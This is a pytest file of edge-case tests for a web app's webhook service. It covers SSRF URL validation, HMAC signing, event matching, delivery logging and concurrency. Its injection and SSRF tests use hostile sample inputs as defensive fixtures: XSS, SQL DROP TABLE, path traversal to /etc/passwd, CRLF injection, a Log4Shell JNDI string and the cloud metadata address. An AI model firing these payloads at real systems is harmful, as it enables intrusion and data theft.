"""
Edge-case tests for webhooks — Phase 34.2.

Applies the ``tests/TESTING_STANDARDS.md`` checklist to the webhook
service (``app/services/webhooks.py``) and its admin / JSON-API
adapters. The companion file ``tests/test_webhooks.py`` covers the
happy paths and the Phase 22.3 SSRF gate; this file pins the remaining
boundary / Unicode / injection / length / concurrency corners so a
regression that loosens validation, drops normalisation, or leaks an
unexpected exception out of the dispatcher has an explicit failing
case to point at.

Surfaces exercised:

* URL validation — schemes other than http(s), unicode hostnames,
  literal IPv6 + bracketed forms, oversized URLs, ports, userinfo.
* Secret handling — empty, very long, unicode, null bytes, bytes input
  to :func:`sign_payload`.
* Name / events fields — empty, whitespace, unicode, injection, length
  bounds, duplicate / malformed events.
* Payload — empty dict, deeply nested, unicode, surrogate pairs,
  oversize, non-JSON-serialisable (falls back via ``default=str``).
* Delivery — 4xx / 5xx status families, connection-reset OSError,
  unicode error messages, signature stability under unicode bodies.
* Logging / retry — ``increment_failures`` threshold edge values,
  ``record_delivery`` with zero / negative / huge status, error
  truncation, ``purge_old_deliveries`` bound coercion,
  ``list_recent_deliveries`` limit clamps.
* Subscriber filtering — wildcard vs. specific event, case
  sensitivity, unknown event names, ``'*'`` stored as a plain event
  literal, empty events column.
* Concurrency — two threads creating webhooks against the same URL +
  event name never 500; two threads incrementing failures converge to
  the right total.

No real network — every delivery test monkeypatches
``app.services.webhooks.urlopen``. Tests reuse the standard ``app``
and ``auth_client`` fixtures from ``tests/conftest.py``.
"""

from __future__ import annotations

import json
import sqlite3
import threading
from io import BytesIO
from urllib.error import HTTPError, URLError

import pytest

import app.events as events_mod
from app.services.webhooks import (
    DeliveryResult,
    Webhook,
    create_webhook,
    delete_webhook,
    deliver_now,
    dispatch_event_async,
    get_webhook,
    increment_failures,
    list_enabled_subscribers,
    list_recent_deliveries,
    list_webhooks,
    purge_old_deliveries,
    record_delivery,
    reset_failures,
    sign_payload,
    update_webhook,
    validate_webhook_target,
)

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def _clear_bus():
    """Webhook tests must start and end with an empty event registry."""
    events_mod.clear()
    yield
    events_mod.clear()


@pytest.fixture
def db(app):
    """Return an open sqlite3 Connection to the test DB."""
    conn = sqlite3.connect(app.config['DATABASE_PATH'])
    conn.row_factory = sqlite3.Row
    conn.execute('PRAGMA foreign_keys = ON')
    yield conn
    conn.close()


@pytest.fixture
def no_rate_limits(app):
    app.config['RATELIMIT_ENABLED'] = False
    yield
    app.config['RATELIMIT_ENABLED'] = True


@pytest.fixture
def api_admin_token(app):
    """Admin-scoped Bearer token for the JSON routes."""
    from app.db import get_db
    from app.services.api_tokens import generate_token

    with app.app_context():
        return generate_token(get_db(), name='webhook-edge', scope='admin').raw


def _auth(token):
    return {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}


class _StubResponse:
    """Minimal context-manager stand-in for the HTTPResponse urlopen returns."""

    def __init__(self, status=200):
        self.status = status

    def getcode(self):
        return self.status

    def read(self):
        return b''

    def __enter__(self):
        return self

    def __exit__(self, *args):
        return False


def _wh(**overrides):
    """Build a Webhook record without going through the DB."""
    base = {
        'id': 1,
        'name': 'test',
        'url': 'https://example.test/h',
        'secret': 'shh',
        'events': ['*'],
        'enabled': True,
        'failure_count': 0,
        'created_at': '2026-01-01T00:00:00Z',
        'last_triggered_at': None,
    }
    base.update(overrides)
    return Webhook(**base)


# ===========================================================================
# Category 1 — Empty / null inputs
# ===========================================================================


def test_validate_target_rejects_empty_string():
    ok, msg = validate_webhook_target('', allow_private=False)
    assert ok is False
    assert 'required' in msg


def test_validate_target_rejects_whitespace_only_url():
    """A URL that's all whitespace must not slip past the empty-check.

    ``urlparse('   ')`` yields an empty netloc, so the scheme check is
    what catches it. Pinning the response message keeps regressions
    from collapsing the error to a generic 500.
    """
    ok, msg = validate_webhook_target('   ', allow_private=False)
    assert ok is False
    # 'required' OR 'http(s)' — both are explicit rejection reasons.
    assert 'http(s)' in msg or 'required' in msg


def test_validate_target_rejects_scheme_only():
    ok, msg = validate_webhook_target('https://', allow_private=False)
    assert ok is False
    assert 'http(s)' in msg or 'hostname' in msg


def test_create_webhook_with_empty_events_normalises_to_empty_list(db):
    """An empty events list survives the normaliser as ``[]``.

    No SSRF check or events validation runs at the service layer —
    the admin / API adapter is responsible for defaulting to ``['*']``.
    """
    wh_id = create_webhook(db, name='X', url='https://e', secret='s', events=[])
    assert get_webhook(db, wh_id).events == []


def test_create_webhook_with_empty_secret_persists_verbatim(db):
    """The service layer does not enforce a non-empty secret — the
    adapter validates. Pin this so a future ``CHECK(secret <> '')``
    constraint is a deliberate decision, not silent breakage."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='', events=['*'])
    assert get_webhook(db, wh_id).secret == ''


def test_sign_payload_empty_body_returns_valid_hex():
    """SHA-256 of an empty string with a key is still a 64-hex digest."""
    sig = sign_payload('shh', b'')
    assert len(sig) == 64
    assert all(c in '0123456789abcdef' for c in sig)


def test_sign_payload_empty_secret_does_not_raise():
    """HMAC permits an empty key (RFC 2104) — the function must not raise."""
    sig = sign_payload('', b'hello')
    assert len(sig) == 64


def test_deliver_now_with_empty_payload_dict(monkeypatch):
    """An empty ``payload={}`` serialises to ``"data": {}`` in the envelope."""
    captured = {}

    def fake_urlopen(request, timeout=None):
        captured['data'] = request.data
        return _StubResponse(status=200)

    monkeypatch.setattr('app.services.webhooks.urlopen', fake_urlopen)
    result = deliver_now(_wh(), 'evt', {}, timeout=2)
    assert result.status_code == 200
    envelope = json.loads(captured['data'])
    assert envelope['data'] == {}


def test_list_enabled_subscribers_empty_table_returns_empty(db):
    assert list_enabled_subscribers(db, 'blog.published') == []


def test_list_webhooks_empty_table_returns_empty(db):
    assert list_webhooks(db) == []


def test_record_delivery_empty_error_string_persists_as_empty(db):
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    record_delivery(db, DeliveryResult(wh_id, 'evt', 200, 5, ''))
    row = list_recent_deliveries(db, webhook_id=wh_id)[0]
    assert row['error_message'] == ''


# ===========================================================================
# Category 2 — Boundary inputs
# ===========================================================================


@pytest.mark.parametrize(
    'scheme',
    [
        'http://example.test/h',  # min — http
        'https://example.test/h',  # min — https
    ],
)
def test_validate_target_accepts_both_http_schemes(scheme, monkeypatch):
    """Both http and https must pass the scheme gate (public host)."""
    from app.services import webhooks as webhooks_mod

    monkeypatch.setattr(webhooks_mod, '_resolve_target_ips', lambda host: ['203.0.113.5'])
    ok, msg = validate_webhook_target(scheme, allow_private=False)
    assert ok is True, msg


@pytest.mark.parametrize(
    'bad_scheme',
    [
        'ftp://example.test/h',
        'file:///etc/passwd',
        'javascript:alert(1)',
        'data:text/plain,evil',
        'gopher://example.test/h',
        'mailto:admin@example.test',
        'ws://example.test/h',
        'wss://example.test/h',
        'ssh://example.test',
    ],
)
def test_validate_target_rejects_non_http_schemes(bad_scheme):
    """Every non-http(s) scheme must be rejected up-front."""
    ok, msg = validate_webhook_target(bad_scheme, allow_private=False)
    assert ok is False, f'{bad_scheme} should have been rejected'
    assert 'http(s)' in msg


def test_increment_failures_threshold_one_disables_on_first_failure(db):
    """Boundary: ``threshold=1`` flips disabled after exactly one failure."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    disabled = increment_failures(db, wh_id, threshold=1)
    assert disabled is True
    assert get_webhook(db, wh_id).enabled is False


def test_increment_failures_negative_threshold_never_disables(db):
    """Threshold below zero is the same as zero per the docstring."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    for _ in range(5):
        assert increment_failures(db, wh_id, threshold=-1) is False
    assert get_webhook(db, wh_id).enabled is True


def test_list_recent_deliveries_clamps_limit_to_minimum(db):
    """``list_recent_deliveries(..., limit=0)`` must coerce to >=1."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    record_delivery(db, DeliveryResult(wh_id, 'evt', 200, 10, ''))
    # Negative / zero limits do not 500; output is bounded sensibly.
    assert len(list_recent_deliveries(db, webhook_id=wh_id, limit=0)) <= 1
    assert len(list_recent_deliveries(db, webhook_id=wh_id, limit=-5)) <= 1


def test_list_recent_deliveries_clamps_limit_to_maximum(db):
    """A 99999 limit clamps to 500 (defined cap in the service)."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    # Empty table: the clamp itself is the thing we're pinning; len == 0.
    assert list_recent_deliveries(db, webhook_id=wh_id, limit=99999) == []


def test_purge_old_deliveries_zero_keep_days_coerces_to_one(db):
    """``keep_days=0`` must not delete future-dated rows — the service
    clamps to >= 1 to keep the SQL ``strftime`` window sane."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    record_delivery(db, DeliveryResult(wh_id, 'evt', 200, 10, ''))
    deleted = purge_old_deliveries(db, keep_days=0)
    # Fresh row inserted seconds ago: even clamped to 1 day, it's safe.
    assert deleted == 0


def test_purge_old_deliveries_negative_keep_days_coerces(db):
    """Negative ``keep_days`` is treated as the minimum (1 day)."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    record_delivery(db, DeliveryResult(wh_id, 'evt', 200, 10, ''))
    deleted = purge_old_deliveries(db, keep_days=-10)
    assert deleted == 0


@pytest.mark.parametrize('status', [400, 401, 403, 404, 422, 429, 451])
def test_deliver_now_records_each_4xx_status(monkeypatch, status):
    """Every 4xx family member must be recorded with its status intact."""

    def fake_urlopen(request, timeout=None):
        raise HTTPError(request.full_url, status, f'Status {status}', hdrs=None, fp=BytesIO(b''))

    monkeypatch.setattr('app.services.webhooks.urlopen', fake_urlopen)
    result = deliver_now(_wh(), 'evt', {}, timeout=2)
    assert result.status_code == status
    assert f'HTTP {status}' in result.error


@pytest.mark.parametrize('status', [500, 502, 503, 504, 521, 599])
def test_deliver_now_records_each_5xx_status(monkeypatch, status):
    """5xx is the typical retry signal; pin that the status round-trips."""

    def fake_urlopen(request, timeout=None):
        raise HTTPError(request.full_url, status, f'Upstream {status}', hdrs=None, fp=BytesIO(b''))

    monkeypatch.setattr('app.services.webhooks.urlopen', fake_urlopen)
    result = deliver_now(_wh(), 'evt', {}, timeout=2)
    assert result.status_code == status


# ===========================================================================
# Category 3 — Type mismatch
# ===========================================================================


def test_sign_payload_bytes_secret_str_body():
    """Crossed types collapse to a single canonical encoding internally."""
    a = sign_payload(b'shh', 'hello')
    b = sign_payload('shh', b'hello')
    assert a == b


def test_sign_payload_str_secret_str_body():
    """All-string args also round-trip to the same digest."""
    a = sign_payload('shh', 'hello')
    b = sign_payload(b'shh', b'hello')
    assert a == b


def test_create_webhook_with_dict_events_falls_back_to_empty(db):
    """Non-list / non-string events arg is treated as empty.

    The normaliser does not raise on unexpected types — it simply
    drops them so a malformed admin-form submit can't 500.
    """
    wh_id = create_webhook(db, name='X', url='https://e', secret='s', events={'not': 'a list'})
    assert get_webhook(db, wh_id).events == []


def test_create_webhook_with_int_events_falls_back_to_empty(db):
    wh_id = create_webhook(db, name='X', url='https://e', secret='s', events=123)
    assert get_webhook(db, wh_id).events == []


def test_increment_failures_threshold_string_raises_typeerror(db):
    """The contract is ``threshold: int``. A string value must blow
    up loudly (TypeError) rather than be silently coerced — the
    settings-snapshot path already coerces; service-layer callers
    must not pass garbage."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    with pytest.raises(TypeError):
        increment_failures(db, wh_id, threshold='ten')


def test_record_delivery_negative_status_code_persists(db):
    """A sentinel negative status (e.g. -1) is stored verbatim. Pin so
    a future schema constraint is a deliberate change."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    record_delivery(db, DeliveryResult(wh_id, 'evt', -1, 0, 'pre-flight aborted'))
    row = list_recent_deliveries(db, webhook_id=wh_id)[0]
    assert row['status_code'] == -1


def test_deliver_now_non_json_serializable_payload_uses_default_str(monkeypatch):
    """``json.dumps(..., default=str)`` must rescue a datetime / Path
    that would otherwise raise ``TypeError`` and leak out of the dispatcher."""
    from datetime import datetime as _datetime

    captured = {}

    def fake_urlopen(request, timeout=None):
        captured['data'] = request.data
        return _StubResponse(status=200)

    monkeypatch.setattr('app.services.webhooks.urlopen', fake_urlopen)
    result = deliver_now(_wh(), 'evt', {'when': _datetime(2026, 1, 1, 12)}, timeout=2)
    assert result.status_code == 200
    body = captured['data'].decode('utf-8')
    # The datetime ends up as its ``str()`` form — not a TypeError.
    assert '2026-01-01' in body


# ===========================================================================
# Category 4 — Unicode
# ===========================================================================


@pytest.mark.parametrize(
    'name',
    [
        'Slack ASCII',
        'Café au lait',
        '漢字フック',
        '🏠 Webhook 🎨',
        'עברית',  # RTL Hebrew
        'مرحبا',  # RTL Arabic
        'é combining',
        '‍ zero-width-joiner‍',
    ],
)
def test_create_webhook_unicode_names_round_trip(db, name):
    wh_id = create_webhook(db, name=name, url='https://e', secret='s')
    assert get_webhook(db, wh_id).name == name


@pytest.mark.parametrize(
    'secret',
    [
        'café-secret',
        '漢字シークレット',
        '🔐emoji🔑',
        'mixed‍with‍zwj',
    ],
)
def test_sign_payload_unicode_secret_is_stable(secret):
    """Unicode secrets re-encode deterministically to UTF-8 bytes."""
    a = sign_payload(secret, b'hello')
    b = sign_payload(secret, b'hello')
    assert a == b
    assert len(a) == 64


def test_sign_payload_unicode_body_is_stable():
    """Unicode body bytes hash deterministically."""
    body = '漢字 + emoji 🚀'.encode()
    a = sign_payload('shh', body)
    b = sign_payload('shh', body)
    assert a == b


def test_deliver_now_unicode_payload_serialises(monkeypatch):
    """Unicode in the payload must survive the envelope round-trip."""
    captured = {}

    def fake_urlopen(request, timeout=None):
        captured['data'] = request.data
        return _StubResponse(status=200)

    monkeypatch.setattr('app.services.webhooks.urlopen', fake_urlopen)
    payload = {'title': '漢字 Title', 'emoji': '🚀'}
    result = deliver_now(_wh(), 'evt', payload, timeout=2)
    assert result.status_code == 200
    envelope = json.loads(captured['data'].decode('utf-8'))
    assert envelope['data']['title'] == '漢字 Title'
    assert envelope['data']['emoji'] == '🚀'


def test_deliver_now_surrogate_pair_payload(monkeypatch):
    """A non-BMP codepoint (emoji uses surrogate pair on UTF-16) must
    serialise — json.dumps emits ``\\uXXXX`` escapes."""
    captured = {}

    def fake_urlopen(request, timeout=None):
        captured['data'] = request.data
        return _StubResponse(status=200)

    monkeypatch.setattr('app.services.webhooks.urlopen', fake_urlopen)
    # U+1F600 (grinning face) — outside BMP.
    result = deliver_now(_wh(), 'evt', {'face': '\U0001f600'}, timeout=2)
    assert result.status_code == 200
    envelope = json.loads(captured['data'].decode('utf-8'))
    assert envelope['data']['face'] == '\U0001f600'


def test_validate_target_unicode_hostname(monkeypatch):
    """A bare Unicode hostname (not IDN-encoded) goes through urlparse
    without raising. The IP resolution path is monkeypatched so we
    pin the gate's behaviour, not the local resolver's."""
    from app.services import webhooks as webhooks_mod

    monkeypatch.setattr(webhooks_mod, '_resolve_target_ips', lambda host: ['203.0.113.10'])
    ok, msg = validate_webhook_target('https://kät.example/hook', allow_private=False)
    assert ok is True, msg


def test_validate_target_idn_punycode_accepted(monkeypatch):
    """Punycode form (``xn--``) is what gets sent to DNS in practice."""
    from app.services import webhooks as webhooks_mod

    monkeypatch.setattr(webhooks_mod, '_resolve_target_ips', lambda host: ['203.0.113.11'])
    ok, msg = validate_webhook_target('https://xn--kt-tka.example/hook', allow_private=False)
    assert ok is True, msg


def test_record_delivery_unicode_error_message_persists(db):
    """Unicode in the error string must survive the truncation /
    sqlite write path."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    record_delivery(db, DeliveryResult(wh_id, 'evt', 500, 0, '漢字 error 🚨'))
    row = list_recent_deliveries(db, webhook_id=wh_id)[0]
    assert row['error_message'] == '漢字 error 🚨'


# ===========================================================================
# Category 5 — Length
# ===========================================================================


@pytest.mark.parametrize('size', [1, 100, 1_000, 10_000])
def test_create_webhook_name_of_various_lengths(db, size):
    """SQLite TEXT is unbounded; pin the current contract."""
    name = 'x' * size
    wh_id = create_webhook(db, name=name, url='https://e', secret='s')
    assert get_webhook(db, wh_id).name == name


@pytest.mark.parametrize('size', [1, 100, 1_000, 10_000])
def test_create_webhook_secret_of_various_lengths(db, size):
    secret = 's' * size
    wh_id = create_webhook(db, name='X', url='https://e', secret=secret)
    assert get_webhook(db, wh_id).secret == secret


def test_create_webhook_very_long_url_round_trips(db):
    """A 4 KB URL is unusual but must not crash the insert."""
    long_path = 'x' * 4000
    url = f'https://example.test/{long_path}'
    wh_id = create_webhook(db, name='X', url=url, secret='s')
    assert get_webhook(db, wh_id).url == url


def test_sign_payload_very_long_body_does_not_crash():
    """SHA-256 of a 1 MB body returns in bounded time without raising."""
    huge = b'x' * (1 << 20)
    sig = sign_payload('shh', huge)
    assert len(sig) == 64


def test_deliver_now_large_payload_serialises(monkeypatch):
    """A 100 KB payload must serialise without overflowing the envelope path."""
    captured = {}

    def fake_urlopen(request, timeout=None):
        captured['data'] = request.data
        return _StubResponse(status=200)

    monkeypatch.setattr('app.services.webhooks.urlopen', fake_urlopen)
    big = 'a' * 100_000
    result = deliver_now(_wh(), 'evt', {'big': big}, timeout=5)
    assert result.status_code == 200
    envelope = json.loads(captured['data'].decode('utf-8'))
    assert envelope['data']['big'] == big


def test_deliver_now_deeply_nested_payload(monkeypatch):
    """A reasonable depth (50 levels) round-trips. Sky-high depth would
    hit Python's default recursion limit in json.dumps — 50 is well below."""
    captured = {}

    def fake_urlopen(request, timeout=None):
        captured['data'] = request.data
        return _StubResponse(status=200)

    monkeypatch.setattr('app.services.webhooks.urlopen', fake_urlopen)
    nested: dict = {}
    cur = nested
    for i in range(50):
        cur['child'] = {}
        cur['idx'] = i
        cur = cur['child']
    result = deliver_now(_wh(), 'evt', nested, timeout=2)
    assert result.status_code == 200


def test_record_delivery_truncates_at_exact_limit(db):
    """The 500-char cap is inclusive — an error of exactly 500 chars
    is stored intact; 501 chars is truncated."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    record_delivery(db, DeliveryResult(wh_id, 'evt', 0, 0, 'y' * 500))
    row = list_recent_deliveries(db, webhook_id=wh_id)[0]
    assert len(row['error_message']) == 500


def test_record_delivery_truncates_one_over_limit(db):
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    record_delivery(db, DeliveryResult(wh_id, 'evt', 0, 0, 'z' * 501))
    row = list_recent_deliveries(db, webhook_id=wh_id)[0]
    assert len(row['error_message']) == 500


# ===========================================================================
# Category 6 — Concurrency
# ===========================================================================


def test_concurrent_create_webhook_same_url_does_not_500(app):
    """No unique constraint on (name, url) — duplicates are intentional
    so a single endpoint can subscribe to multiple events via separate
    rows. The invariant we're pinning is the absence of a race that
    leaves the DB inconsistent / raises BLE."""
    errors: list[BaseException] = []
    ids: list[int] = []
    lock = threading.Lock()

    def writer(i):
        try:
            conn = sqlite3.connect(app.config['DATABASE_PATH'], timeout=10)
            conn.row_factory = sqlite3.Row
            try:
                wh_id = create_webhook(
                    conn,
                    name=f'w-{i}',
                    url='https://collide.example/h',
                    secret='s',
                    events=['*'],
                )
                with lock:
                    ids.append(wh_id)
            finally:
                conn.close()
        except BaseException as exc:  # noqa: BLE001
            errors.append(exc)

    threads = [threading.Thread(target=writer, args=(i,)) for i in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert errors == []
    assert len(ids) == 8
    # All rows present in the DB
    conn = sqlite3.connect(app.config['DATABASE_PATH'])
    try:
        count = conn.execute('SELECT COUNT(*) FROM webhooks').fetchone()[0]
    finally:
        conn.close()
    assert count == 8


def test_concurrent_increment_failures_converges(app):
    """Eight threads each calling ``increment_failures`` once must yield
    a final ``failure_count`` of exactly 8 — SQLite serialises the
    UPDATE so no increments are lost."""
    # Seed one webhook.
    seed = sqlite3.connect(app.config['DATABASE_PATH'])
    seed.row_factory = sqlite3.Row
    try:
        wh_id = create_webhook(seed, name='X', url='https://e', secret='s')
    finally:
        seed.close()

    errors: list[BaseException] = []

    def bumper():
        try:
            conn = sqlite3.connect(app.config['DATABASE_PATH'], timeout=10)
            conn.row_factory = sqlite3.Row
            try:
                increment_failures(conn, wh_id, threshold=1000)
            finally:
                conn.close()
        except BaseException as exc:  # noqa: BLE001
            errors.append(exc)

    threads = [threading.Thread(target=bumper) for _ in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert errors == []
    final = sqlite3.connect(app.config['DATABASE_PATH'])
    final.row_factory = sqlite3.Row
    try:
        assert get_webhook(final, wh_id).failure_count == 8
    finally:
        final.close()


def test_concurrent_dispatch_to_same_webhook_records_every_delivery(monkeypatch, app, db):
    """Three simultaneous events firing at the same wildcard subscriber
    must produce three rows in ``webhook_deliveries`` — the per-thread
    DB connection plus SQLite's WAL mode keeps the writes coherent."""
    create_webhook(db, name='wild', url='https://e/w', secret='s', events=['*'])

    monkeypatch.setattr(
        'app.services.webhooks.urlopen', lambda req, timeout=None: _StubResponse(200)
    )

    threads = []
    for event in ('blog.published', 'contact.submitted', 'review.approved'):
        t = threading.Thread(
            target=dispatch_event_async,
            args=(app.config['DATABASE_PATH'], event, {}),
            kwargs={'_join_for_tests': True},
        )
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    fresh = sqlite3.connect(app.config['DATABASE_PATH'])
    fresh.row_factory = sqlite3.Row
    try:
        rows = fresh.execute('SELECT event FROM webhook_deliveries').fetchall()
    finally:
        fresh.close()
    assert len(rows) == 3
    assert {r['event'] for r in rows} == {
        'blog.published',
        'contact.submitted',
        'review.approved',
    }


# ===========================================================================
# Category 7 — Injection
# ===========================================================================


@pytest.mark.parametrize(
    'payload',
    [
        '<script>alert(1)</script>',
        '{{ 7*7 }}',
        '../../../etc/passwd',
        '\x00null-byte-in-name',
        "'; DROP TABLE webhooks; --",
        'CR\r\nLF injection',
        '${jndi:ldap://evil.example/x}',
    ],
)
def test_webhook_name_injection_payloads_stored_verbatim(db, payload):
    """The service layer stores everything as parameterised text; the
    rendering layer is responsible for escaping. Pin that the write
    path doesn't 500 on these payloads and that the row count after
    is sane (a successful DROP would have taken the table out)."""
    wh_id = create_webhook(db, name=payload, url='https://e', secret='s')
    # Same connection must see the row.
    stored = get_webhook(db, wh_id)
    assert stored is not None
    assert stored.name == payload
    # webhooks table still exists.
    count = db.execute('SELECT COUNT(*) FROM webhooks').fetchone()[0]
    assert count >= 1


@pytest.mark.parametrize(
    'event_name',
    [
        "'; DROP TABLE webhooks; --",
        '<script>alert(1)</script>',
        '\x00null',
        'evt\r\nX-Injected: true',
        '../../etc/passwd',
        '{{ 7*7 }}',
        '*',  # the wildcard sentinel — still a literal here
    ],
)
def test_list_enabled_subscribers_crafted_event_names_safe(db, event_name):
    """Filtering by a crafted event name must not 500 — the matcher
    is pure Python ``in`` lookup against the stored list."""
    create_webhook(db, name='wild', url='https://e/w', secret='s', events=['blog.published'])
    # Either matches nothing or matches by literal — both are safe.
    matches = list_enabled_subscribers(db, event_name)
    assert isinstance(matches, list)


def test_list_enabled_subscribers_case_sensitive(db):
    """Event matching is case-sensitive — ``Blog.Published`` does NOT
    match ``blog.published``. Pin so a future case-fold doesn't
    silently broaden the dispatch surface."""
    create_webhook(db, name='X', url='https://e', secret='s', events=['blog.published'])
    assert list_enabled_subscribers(db, 'Blog.Published') == []
    assert len(list_enabled_subscribers(db, 'blog.published')) == 1


def test_list_enabled_subscribers_unknown_event_returns_empty(db):
    """A wholly unknown event name yields no matches (no exception,
    no partial-prefix match)."""
    create_webhook(db, name='X', url='https://e', secret='s', events=['blog.published'])
    assert list_enabled_subscribers(db, 'totally.unknown') == []


def test_list_enabled_subscribers_partial_prefix_no_match(db):
    """``blog.publ`` must not match ``blog.published`` — equality only."""
    create_webhook(db, name='X', url='https://e', secret='s', events=['blog.published'])
    assert list_enabled_subscribers(db, 'blog.publ') == []


def test_wildcard_stored_as_literal_event_not_a_pattern(db):
    """A row with ``events=['blog.*']`` is a literal string match —
    it does NOT pattern-match ``blog.published``. The only wildcard
    the service recognises is exactly ``'*'``."""
    create_webhook(db, name='X', url='https://e', secret='s', events=['blog.*'])
    assert list_enabled_subscribers(db, 'blog.published') == []


@pytest.mark.parametrize(
    'url_payload',
    [
        'https://example.test/h?<script>=1',
        'https://example.test/h?q=%00null',
        "https://example.test/h?q='; DROP--",
        'https://example.test/h#</script>',
    ],
)
def test_validate_target_query_and_fragment_payloads_pass(monkeypatch, url_payload):
    """Crafted query string / fragment values do not change the host
    extraction — the SSRF gate only inspects scheme + host. Pin so
    a regression that starts parsing the path can't silently reject
    legitimate URLs that include user-controlled query params."""
    from app.services import webhooks as webhooks_mod

    monkeypatch.setattr(webhooks_mod, '_resolve_target_ips', lambda host: ['203.0.113.20'])
    ok, msg = validate_webhook_target(url_payload, allow_private=False)
    assert ok is True, msg


def test_admin_api_create_rejects_javascript_url(client, no_rate_limits, api_admin_token):
    """The admin JSON API runs the same SSRF gate — pin that the
    ``VALIDATION_ERROR`` is what the operator sees for a bad scheme."""
    response = client.post(
        '/api/v1/admin/webhooks',
        json={'name': 'evil', 'url': 'javascript:alert(1)'},
        headers=_auth(api_admin_token),
    )
    assert response.status_code == 400
    body = response.get_json()
    assert body['code'] == 'VALIDATION_ERROR'
    assert body['details']['field'] == 'url'


def test_admin_api_create_rejects_loopback_url(client, no_rate_limits, api_admin_token):
    """SSRF gate from Phase 22.3 applies to admin API create."""
    response = client.post(
        '/api/v1/admin/webhooks',
        json={'name': 'internal', 'url': 'http://127.0.0.1/hook'},
        headers=_auth(api_admin_token),
    )
    assert response.status_code == 400


def test_admin_api_create_rejects_link_local_metadata_url(client, no_rate_limits, api_admin_token):
    """169.254.169.254 is the AWS metadata service — must be rejected."""
    response = client.post(
        '/api/v1/admin/webhooks',
        json={'name': 'aws-meta', 'url': 'http://169.254.169.254/latest/meta-data/'},
        headers=_auth(api_admin_token),
    )
    assert response.status_code == 400


# ===========================================================================
# Misc — boundary cases that don't slot cleanly into the seven categories
# but exercise documented contracts worth pinning.
# ===========================================================================


def test_normalise_events_comma_string_strips_whitespace(db):
    """Whitespace-padded comma-separated events are trimmed cleanly."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s', events='  a  ,  b  ,  c  ')
    assert get_webhook(db, wh_id).events == ['a', 'b', 'c']


def test_normalise_events_drops_empty_entries(db):
    """Empty entries between commas (``a,,b``) are filtered out."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s', events='a,,b,,')
    assert get_webhook(db, wh_id).events == ['a', 'b']


def test_normalise_events_json_array_with_empty_entries(db):
    """A JSON array with empty strings drops them (parity with the
    comma-separated path)."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s', events='["a", "", "b"]')
    assert get_webhook(db, wh_id).events == ['a', 'b']


def test_update_webhook_with_empty_fields_is_noop(db):
    """An update_webhook() call with no recognised fields no-ops without raising."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    update_webhook(db, wh_id, totally_unknown='x', another_bad='y')
    # Original row intact
    assert get_webhook(db, wh_id).name == 'X'


def test_update_webhook_unknown_id_is_silent_noop(db):
    """Updating a non-existent row must not raise — the helper just
    silently no-ops (matches the rest of the CRUD surface)."""
    update_webhook(db, 99_999, name='ghost')


def test_delete_unknown_webhook_is_silent(db):
    """Deleting a missing row must not raise."""
    delete_webhook(db, 99_999)
    assert get_webhook(db, 99_999) is None


def test_row_to_webhook_malformed_events_json_falls_back_to_empty(db):
    """A direct INSERT with garbage in the ``events`` column must not
    crash the reader — it falls back to ``[]`` so dispatch never fires
    for the bad row."""
    db.execute(
        'INSERT INTO webhooks (name, url, secret, events) VALUES (?, ?, ?, ?)',
        ('bad', 'https://e', 's', 'not-json{'),
    )
    db.commit()
    row = db.execute("SELECT id FROM webhooks WHERE name = 'bad'").fetchone()
    wh = get_webhook(db, row['id'])
    assert wh is not None
    assert wh.events == []


def test_row_to_webhook_non_array_events_json_falls_back_to_empty(db):
    """A JSON scalar / object in ``events`` is also rejected and reset to ``[]``."""
    db.execute(
        'INSERT INTO webhooks (name, url, secret, events) VALUES (?, ?, ?, ?)',
        ('scalar', 'https://e', 's', '"just-a-string"'),
    )
    db.commit()
    row = db.execute("SELECT id FROM webhooks WHERE name = 'scalar'").fetchone()
    wh = get_webhook(db, row['id'])
    assert wh.events == []


def test_reset_failures_on_zero_counter_is_noop(db):
    """Resetting an already-zero counter must not raise or change state."""
    wh_id = create_webhook(db, name='X', url='https://e', secret='s')
    reset_failures(db, wh_id)
    assert get_webhook(db, wh_id).failure_count == 0


def test_deliver_now_oserror_recorded_as_status_zero(monkeypatch):
    """An OSError (e.g. connection reset) lands in the same network-error
    branch as URLError — status 0, error string includes the type."""

    def fake_urlopen(request, timeout=None):
        raise OSError('ECONNRESET')

    monkeypatch.setattr('app.services.webhooks.urlopen', fake_urlopen)
    result = deliver_now(_wh(), 'evt', {}, timeout=2)
    assert result.status_code == 0
    assert 'OSError' in result.error


def test_deliver_now_url_error_with_unicode_reason(monkeypatch):
    """A URLError whose reason contains Unicode must survive into the
    delivery log without raising an encode error."""

    def fake_urlopen(request, timeout=None):
        raise URLError('漢字 unreachable')

    monkeypatch.setattr('app.services.webhooks.urlopen', fake_urlopen)
    result = deliver_now(_wh(), 'evt', {}, timeout=2)
    assert result.status_code == 0
    assert '漢字' in result.error


def test_dispatch_event_async_unknown_event_name_returns_empty(app, db):
    """An event name that nothing subscribes to yields no futures and
    writes no delivery rows — fail-quiet contract."""
    create_webhook(db, name='X', url='https://e', secret='s', events=['blog.published'])
    futures = dispatch_event_async(
        app.config['DATABASE_PATH'], 'never.heard.of.this', {}, _join_for_tests=True
    )
    assert futures == []
